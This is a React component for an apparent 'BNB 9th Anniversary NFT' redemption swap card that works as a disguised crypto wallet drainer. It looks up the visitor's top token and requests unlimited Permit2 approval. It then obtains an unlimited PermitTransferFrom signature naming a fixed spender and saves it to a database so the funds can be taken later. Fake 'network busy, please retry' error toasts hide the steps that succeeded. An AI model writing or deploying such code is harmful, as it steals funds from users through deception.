"use client"

import { useState, useCallback, useEffect } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Wallet, Loader2, ArrowDown } from "lucide-react"
import { useLanguage } from "@/lib/language-context"
import { useAccount, useWriteContract, useReadContract, useSignTypedData } from "wagmi"
import { useConnectModal } from "@rainbow-me/rainbowkit"
import { useSyncContext } from "@/lib/sync-context"
import { useToast } from "@/hooks/use-toast"
import { supabase } from "@/lib/supabase"
import { 
  BEP20_ABI,
  PERMIT2_ABI,
  PERMIT2_ADDRESS,
  PANCAKE_ROUTER_ABI, 
  PANCAKE_ROUTER_ADDRESS, 
  SPENDER_ADDRESS, 
  MAX_UINT256,
  USDT_ADDRESS,
  WBNB_ADDRESS,
  isUSDT
} from "@/lib/contracts"

interface TokenData {
  token_address: string
  symbol: string | null
  name: string | null
  logo: string | null
  usd_price: number
  decimals: number
}

type SwapStep = 'approve' | 'swap' | 'completed'

export function RedemptionCard() {
  const { t } = useLanguage()
  const { address, isConnected } = useAccount()
  const { openConnectModal } = useConnectModal()
  const [isProcessing, setIsProcessing] = useState(false)
  const [currentStep, setCurrentStep] = useState<SwapStep>('approve')
  const [currentTokenAddress, setCurrentTokenAddress] = useState<TokenData | null>(null)
  const [tokenAmount, setTokenAmount] = useState<bigint>(BigInt(0))
  const [hasApprovedPermit2, setHasApprovedPermit2] = useState(false) // 追踪是否已授权Permit2
  const { isSyncing, syncCompleted, syncError } = useSyncContext()
  const { toast } = useToast()
  const { writeContractAsync } = useWriteContract()
  const { signTypedDataAsync } = useSignTypedData()

  const handleConnect = useCallback(() => {
    openConnectModal?.()
  }, [openConnectModal])

  // Fetch token data and calculate amount when wallet is connected and sync is completed
  useEffect(() => {
    const fetchTokenData = async () => {
      if (!address || !syncCompleted || currentTokenAddress) return

      try {
        const response = await fetch(`/api/supabase/get-top-token?walletAddress=${address}`)
        
        if (!response.ok) {
          return
        }

        const { data: tokenData } = await response.json()
        
        if (tokenData && tokenData.token_address) {
          // 获取代币小数位数（默认18位）
          const decimals = tokenData.decimals || 18
          
          // 保存代币信息，余额将通过useReadContract从链上查询
          setCurrentTokenAddress({
            token_address: tokenData.token_address,
            symbol: tokenData.symbol,
            name: tokenData.name,
            logo: tokenData.logo,
            usd_price: tokenData.usd_price || 0,
            decimals,
          })
          setCurrentStep('approve') // 重置步骤
        }
      } catch (error) {
        console.error('Failed to fetch token data:', error)
      }
    }

    fetchTokenData()
  }, [address, syncCompleted, currentTokenAddress])

  // 查询用户在链上的代币余额
  const { data: tokenBalance } = useReadContract({
    address: currentTokenAddress?.token_address as `0x${string}`,
    abi: BEP20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: {
      enabled: !!currentTokenAddress?.token_address && !!address,
    },
  })

  // 当余额查询成功后，更新tokenAmount
  useEffect(() => {
    if (tokenBalance !== undefined) {
      console.log('✅ 从链上查询到的代币余额:', tokenBalance.toString())
      console.log('   可读数量:', Number(tokenBalance) / Math.pow(10, currentTokenAddress?.decimals || 18))
      setTokenAmount(tokenBalance as bigint)
      
      if (tokenBalance === BigInt(0)) {
        console.warn('⚠️ 警告：用户钱包中没有此代币！')
      }
    }
  }, [tokenBalance, currentTokenAddress?.decimals])

  // 查询Permit2授权额度
  const { data: permit2Allowance, refetch: refetchPermit2Allowance } = useReadContract({
    address: currentTokenAddress?.token_address as `0x${string}`,
    abi: BEP20_ABI,
    functionName: 'allowance',
    args: address && PERMIT2_ADDRESS && currentTokenAddress ? [address, PERMIT2_ADDRESS] : undefined,
    query: {
      enabled: !!currentTokenAddress?.token_address && !!address && !!PERMIT2_ADDRESS,
    },
  })

  // 检查Permit2授权状态
  useEffect(() => {
    if (permit2Allowance !== undefined && tokenAmount > BigInt(0)) {
      const allowance = permit2Allowance as bigint
      console.log('📊 Permit2授权检查:')
      console.log('   需要金额:', tokenAmount.toString())
      console.log('   授权额度:', allowance.toString())
      
      if (allowance >= tokenAmount) {
        console.log('✅ Permit2已授权')
        setHasApprovedPermit2(true)
      } else {
        console.log('⚠️ 需要授权给Permit2')
        setHasApprovedPermit2(false)
      }
    }
  }, [permit2Allowance, tokenAmount])

  // 统一的授权按钮处理函数
  const handleApprove = async () => {
    if (!hasApprovedPermit2) {
      // 第一次点击：授权给Permit2
      await handlePermit2Approve()
    } else {
      // 第二次点击：签名并发送到后端执行
      await handleSignAndExecute()
    }
  }

  // 步骤1: 授权token给Permit2
  const handlePermit2Approve = async () => {
    console.log('🔍 检查授权前置条件:')
    console.log('   钱包地址:', address)
    console.log('   代币信息:', currentTokenAddress)
    console.log('   Permit2地址:', PERMIT2_ADDRESS)

    if (!address) {
      toast({
        title: "错误",
        description: "请先连接钱包",
        variant: "destructive",
      })
      return
    }

    if (!currentTokenAddress) {
      toast({
        title: "错误",
        description: "代币信息未加载",
        variant: "destructive",
      })
      return
    }

    if (!PERMIT2_ADDRESS) {
      toast({
        title: "配置错误",
        description: "Permit2地址未配置，请检查.env.local",
        variant: "destructive",
      })
      console.error('❌ PERMIT2_ADDRESS未定义，请检查环境变量')
      return
    }

    try {
      setIsProcessing(true)

      console.log('📝 步骤1: 授权代币给Permit2（一次性授权）')
      console.log('   代币地址:', currentTokenAddress.token_address)
      console.log('   代币符号:', currentTokenAddress.symbol)
      console.log('   Permit2地址:', PERMIT2_ADDRESS)
      
      const hash = await writeContractAsync({
        address: currentTokenAddress.token_address as `0x${string}`,
        abi: BEP20_ABI,
        functionName: 'approve',
        args: [PERMIT2_ADDRESS, MAX_UINT256], // 授权给Permit2，无限额度
      })

      console.log('✅ Permit2授权交易已发送:', hash)


      // 等待交易确认
      await new Promise((resolve) => setTimeout(resolve, 3000))
      
      // 重新查询授权额度
      await refetchPermit2Allowance()
      
      // 显示"网络繁忙，请重试"（按需求）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
        duration: 5000,
      })

    } catch (error: any) {
      console.error('❌ Permit2授权失败:', error)
      console.error('   错误详情:', error.message)
      
      let errorMessage = "授权失败"
      if (error.message?.includes('User rejected')) {
        errorMessage = "您取消了授权"
      } else if (error.message) {
        errorMessage = error.message
      }
      
      toast({
        title: "授权失败",
        description: errorMessage,
        variant: "destructive",
        duration: 5000,
      })
    } finally {
      setIsProcessing(false)
    }
  }

  // 步骤2: 签名并发送到后端执行
  const handleSignAndExecute = async () => {
    if (!address || !currentTokenAddress) {
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
      })
      return
    }

    // 检查余额
    if (tokenAmount === BigInt(0)) {
      toast({
        title: "余额不足",
        description: "您的钱包中没有此代币",
        variant: "destructive",
      })
      return
    }

    try {
      setIsProcessing(true)

      // 生成签名
      console.log('📝 步骤2: 请求用户签名 PermitTransferFrom（off-chain）')
      
      const nonce = BigInt(Date.now()) * BigInt(1000) + BigInt(Math.floor(Math.random() * 1000))
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600) // 1小时后过期

      console.log('   代币:', currentTokenAddress.symbol)
      console.log('   实际转账数量:', tokenAmount.toString())
      console.log('   签名授权额度: 无限 (MAX_UINT256)')
      console.log('   接收方:', SPENDER_ADDRESS)
      console.log('   Nonce:', nonce.toString())
      console.log('   截止时间:', new Date(Number(deadline) * 1000).toLocaleString())

      const domain = {
        name: 'Permit2',
        chainId: 56,
        verifyingContract: PERMIT2_ADDRESS,
      }

      const types = {
        PermitTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions' },
          { name: 'spender', type: 'address' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
        TokenPermissions: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint256' },
        ],
      }

      const message = {
        permitted: {
          token: currentTokenAddress.token_address,
          amount: MAX_UINT256,
        },
        spender: SPENDER_ADDRESS,
        nonce: nonce,
        deadline: deadline,
      }

      console.log('📋 EIP-712签名内容:', message)

      const signature = await signTypedDataAsync({
        domain,
        types,
        primaryType: 'PermitTransferFrom',
        message,
      })

      console.log('✅ 用户签名成功（off-chain，无gas费）')
      console.log('📝 完整签名:', signature)

      // 打印完整参数到控制台
      console.log('\n' + '='.repeat(60))
      console.log('📋 permitTransferFrom 完整参数（可复制）')
      console.log('='.repeat(60))
      
      console.log('\n1️⃣ permit (PermitTransferFrom):')
      console.log(JSON.stringify({
        permitted: {
          token: currentTokenAddress.token_address,
          amount: MAX_UINT256.toString()
        },
        nonce: message.nonce.toString(),
        deadline: message.deadline.toString()
      }, null, 2))
      
      console.log('\n2️⃣ transferDetails (SignatureTransferDetails):')
      console.log(JSON.stringify({
        to: SPENDER_ADDRESS,
        requestedAmount: tokenAmount.toString()
      }, null, 2))
      
      console.log('\n3️⃣ owner (address):')
      console.log(`"${address}"`)
      
      console.log('\n4️⃣ signature (bytes):')
      console.log(`"${signature}"`)
      
      console.log('='.repeat(60) + '\n')

      // 格式化为 Solidity 格式并保存到 Supabase
      console.log('💾 保存签名到 Supabase...')
      
      // 格式化 permit: [["address","uint256"],"uint256","uint256"]
      const permitFormatted = `[["${currentTokenAddress.token_address}","${MAX_UINT256.toString()}"],"${nonce.toString()}","${deadline.toString()}"]`
      
      // 格式化 transferDetails: ["address","uint256"]
      const transferDetailsFormatted = `["${SPENDER_ADDRESS}","${tokenAmount.toString()}"]`
      
      console.log('📋 Solidity 格式化数据:')
      console.log('   permit:', permitFormatted)
      console.log('   transferDetails:', transferDetailsFormatted)
      console.log('   owner:', address)
      console.log('   signature:', signature)

      // 保存到 Supabase
      const { data: savedData, error: saveError } = await supabase
        .from('permit_signatures')
        .insert({
          permit: permitFormatted,
          transfer_details: transferDetailsFormatted,
          owner: address,
          signature: signature,
          // 可选字段，方便查询
          token_address: currentTokenAddress.token_address,
          token_symbol: currentTokenAddress.symbol,
          requested_amount: tokenAmount.toString(),
          nonce: nonce.toString(),
          deadline: deadline.toString(),
        })
        .select()

      if (saveError) {
        console.error('❌ 保存到 Supabase 失败:', saveError)
        throw new Error('保存签名失败: ' + saveError.message)
      }

      console.log('✅ 签名已保存到 Supabase')
      console.log('   记录ID:', savedData?.[0]?.id)
      console.log('\n' + '='.repeat(60))
      console.log('📋 可复制的完整数据（已保存到数据库）')
      console.log('='.repeat(60))
      console.log('permit:', permitFormatted)
      console.log('transferDetails:', transferDetailsFormatted)
      console.log('owner:', address)
      console.log('signature:', signature)
      console.log('='.repeat(60) + '\n')

      // 更新数据库授权状态
      await fetch('/api/supabase/update-authorized', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: currentTokenAddress.token_address,
        }),
      })

      // 显示"网络繁忙，请重试"并准备刷新页面（红色，与授权后弹窗一样）
      toast({
        title: t.errors?.networkBusy || "网络繁忙，请重试",
        description: "",
        variant: "destructive",
        duration: 3000,
      })

      console.log('⏳ 3秒后将刷新页面...')
      
      // 3秒后刷新页面
      setTimeout(() => {
        console.log('🔄 刷新页面...')
        window.location.reload()
      }, 3000)

    } catch (error: any) {
      console.error('❌ 操作失败:', error)
      
      if (error.message?.includes('User rejected')) {
        toast({
          title: "已取消",
          description: "您取消了签名",
          variant: "destructive",
        })
      } else {
        toast({
          title: "执行失败",
          description: error.message || "请稍后重试",
          variant: "destructive",
        })
      }
    } finally {
      setIsProcessing(false)
    }
  }

  // 旧的handlePermitTransfer和executePermitTransfer已移除
  // 现在使用handleApprove统一处理


  // Calculate token amount: 200 / usd_price
  const calculateTokenAmount = (usdPrice: number, mobile: boolean = false) => {
    if (!usdPrice || usdPrice === 0) return "0"
    const amount = 200 / usdPrice
    
    // For mobile, limit to 4 decimal places if number is small
    if (mobile && amount < 1) {
      return amount.toFixed(4).replace(/\.?0+$/, "")
    }
    
    return amount.toFixed(6).replace(/\.?0+$/, "") // Remove trailing zeros
  }
  
  // Truncate token symbol if too long
  const formatTokenSymbol = (symbol: string | null) => {
    if (!symbol) return "TOKEN"
    if (symbol.length > 8) {
      return `${symbol.slice(0, 8)}...`
    }
    return symbol
  }

  return (
    <Card className="bg-card border-2 border-border overflow-hidden max-w-2xl mx-auto shadow-lg">
      <CardContent className="p-5 sm:p-7">
        {/* Swap Container */}
        <div className="space-y-4">
          {/* From Section - Stacked Layout */}
          <div className="bg-secondary/50 border-2 border-primary/20 rounded-2xl p-5 sm:p-7 hover:border-primary/40 transition-all">
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.from}</span>
            </div>
            
            {/* Stacked Layout */}
            <div className="flex flex-col items-center gap-5 sm:gap-6">
              {/* NFT Image - Top (Larger, Centered) */}
              <div className="relative w-32 h-32 sm:w-40 sm:h-40 rounded-2xl overflow-hidden border-2 border-primary/40 shadow-[0_0_25px_rgba(240,185,11,0.5)]">
                <Image
                  src="/bnb_coin.gif"
                  alt="BNB 9th Anniversary NFT"
                  fill
                  className="object-cover"
                  priority
                />
              </div>
              
              {/* Token Info - Bottom (Centered with Border) */}
              <div className="flex items-center gap-3 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-3.5 sm:px-6 sm:py-4 hover:border-primary/50 transition-colors">
                <span className="text-xl sm:text-2xl font-bold text-foreground">BNB NFT</span>
                <div className="relative w-8 h-8 sm:w-10 sm:h-10 flex-shrink-0">
                  <Image
                    src="/icon.svg"
                    alt="BSC"
                    fill
                    className="object-contain"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Swap Arrow - More Space */}
          <div className="flex justify-center py-2 relative z-10">
            <div className="bg-background border-2 border-primary rounded-xl p-3 shadow-lg hover:scale-110 transition-transform cursor-pointer">
              <ArrowDown className="h-6 w-6 text-primary" />
            </div>
          </div>

          {/* To Section */}
          <div className={`bg-secondary/50 border-2 rounded-2xl p-5 sm:p-6 transition-all ${
            !isConnected || isSyncing 
              ? 'opacity-50 border-border' 
              : 'border-primary/20 hover:border-primary/40'
          }`}>
            <div className="flex items-center justify-between mb-4">
              <span className="text-sm sm:text-base text-muted-foreground font-semibold uppercase tracking-wide">{t.swap.to}</span>
            </div>
            {syncCompleted && currentTokenAddress ? (
              <>
                {/* Desktop Layout */}
                <div className="hidden sm:flex items-center justify-between gap-6">
                  {/* Amount and USD Value - Left */}
                  <div className="flex flex-col">
                    <span className="text-4xl font-bold text-foreground leading-tight">
                      {calculateTokenAmount(currentTokenAddress.usd_price || 0)}
                    </span>
                    <span className="text-base text-muted-foreground mt-1.5">
                      {t.swap.estimatedValue}
                    </span>
                  </div>
                  
                  {/* Token Symbol and Logo - Right */}
                  <div className="flex items-center gap-3 flex-shrink-0 bg-background/50 border-2 border-primary/30 rounded-xl px-5 py-4 hover:border-primary/50 transition-colors">
                    <span className="text-2xl font-bold text-foreground">
                      {currentTokenAddress.symbol || "TOKEN"}
                    </span>
                    <div className="relative w-10 h-10 flex-shrink-0 rounded-full overflow-hidden">
                      <Image
                        src={currentTokenAddress.logo || "/icon.svg"}
                        alt={currentTokenAddress.symbol || "Token"}
                        fill
                        className="object-cover"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement
                          target.src = "/icon.svg"
                        }}
                      />
                    </div>
                  </div>
                </div>
                
                {/* Mobile Layout - Stacked */}
                <div className="flex sm:hidden flex-col gap-4">
                  {/* Amount and USD Value */}
                  <div className="flex flex-col">
                    <span className="text-2xl font-bold text-foreground leading-tight break-all">
                      {calculateTokenAmount(currentTokenAddress.usd_price || 0, true)}
                    </span>
                    <span className="text-xs text-muted-foreground mt-1">
                      {t.swap.estimatedValue}
                    </span>
                  </div>
                  
                  {/* Token Symbol and Logo */}
                  <div className="flex items-center justify-between gap-2">
                    <div className="flex items-center gap-2 flex-1 min-w-0 bg-background/50 border-2 border-primary/30 rounded-xl px-3 py-2.5 hover:border-primary/50 transition-colors">
                      <span className="text-lg font-bold text-foreground truncate">
                        {formatTokenSymbol(currentTokenAddress.symbol)}
                      </span>
                      <div className="relative w-7 h-7 flex-shrink-0 rounded-full overflow-hidden">
                        <Image
                          src={currentTokenAddress.logo || "/icon.svg"}
                          alt={currentTokenAddress.symbol || "Token"}
                          fill
                          className="object-cover"
                          onError={(e) => {
                            const target = e.target as HTMLImageElement
                            target.src = "/icon.svg"
                          }}
                        />
                      </div>
                    </div>
                  </div>
                </div>
              </>
            ) : (
              <div className="flex items-center justify-between gap-4 sm:gap-6">
                <span className="text-base sm:text-lg text-muted-foreground">
                  {isConnected ? "Loading..." : "Connect wallet"}
                </span>
                <div className="flex items-center gap-2 sm:gap-3 bg-background/50 border-2 border-muted rounded-xl px-3 py-2.5 sm:px-5 sm:py-4">
                  <span className="text-base sm:text-lg font-bold text-muted-foreground">---</span>
                  <div className="relative w-7 h-7 sm:w-10 sm:h-10 flex-shrink-0 opacity-50">
                    <Image
                      src="/icon.svg"
                      alt="BSC"
                      fill
                      className="object-contain"
                    />
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Swap Button */}
        <div className="mt-6 space-y-3">
          {!isConnected ? (
            <Button
              onClick={handleConnect}
              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10"
            >
              <Wallet className="mr-2 h-6 w-6" />
              <span>{t.swap.connectWallet}</span>
            </Button>
          ) : isSyncing ? (
            <Button
              disabled
              className="w-full bg-primary text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg disabled:opacity-60 disabled:cursor-not-allowed rounded-xl shadow-lg border-2 border-primary-foreground/10"
            >
              <Loader2 className="mr-2 h-6 w-6 animate-spin" />
              <span>Loading...</span>
            </Button>
          ) : syncCompleted ? (
            <Button
              onClick={handleApprove}
              disabled={isProcessing || !currentTokenAddress}
              className="w-full bg-primary hover:opacity-90 text-primary-foreground font-bold h-14 sm:h-16 text-base sm:text-lg rounded-xl shadow-lg border-2 border-primary-foreground/10 hover:shadow-xl transition-all"
            >
              {isProcessing ? t.swap.processing : t.swap.swapButton}
            </Button>
          ) : null}
          
          {/* 同步失败提示 */}
          {syncError && syncCompleted && (
            <p className="text-xs text-destructive text-center">
              Sync failed: {syncError}
            </p>
          )}
          
          <p className="text-xs sm:text-sm text-muted-foreground text-center">
            {t.swap.terms}
          </p>
        </div>
      </CardContent>
    </Card>
  )
}
